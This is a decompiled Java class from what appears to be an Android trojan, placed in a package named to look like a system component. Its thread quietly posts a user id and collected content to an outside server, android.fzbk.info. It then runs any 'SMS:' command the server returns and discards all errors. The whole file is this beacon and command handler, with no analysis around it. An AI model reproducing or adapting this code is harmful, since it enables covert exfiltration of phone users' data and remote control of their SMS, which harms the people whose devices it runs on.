package com.android;

import java.util.ArrayList;
import java.util.List;
import org.apache.http.message.BasicNameValuePair;

class MonitorService$1 extends Thread
{
  MonitorService$1(MonitorService paramMonitorService)
  {
  }

  public void run()
  {
    try
    {
      ArrayList localArrayList = new ArrayList();
      localArrayList.add(new BasicNameValuePair("uid", MonitorService.access$0(this.this$0)));
      localArrayList.add(new BasicNameValuePair("content", MonitorService.access$1(this.this$0)));
      String str = this.this$0.PostRequest("http://android.fzbk.info/AndroidInterface/FreeAction.aspx", localArrayList);
      if (str.equals("SMS:finish"))
        return;
      if (str.substring(0, 4).equals("SMS:"))
      {
        this.this$0.HandleSmsCmd(str);
        return;
      }
    }
    catch (Exception localException)
    {
    }
  }
}

/* Location:
 * Qualified Name:     com.android.MonitorService.1
 * Java Class Version: 6 (50.0)
 * JD-Core Version:    0.6.1-SNAPSHOT
 */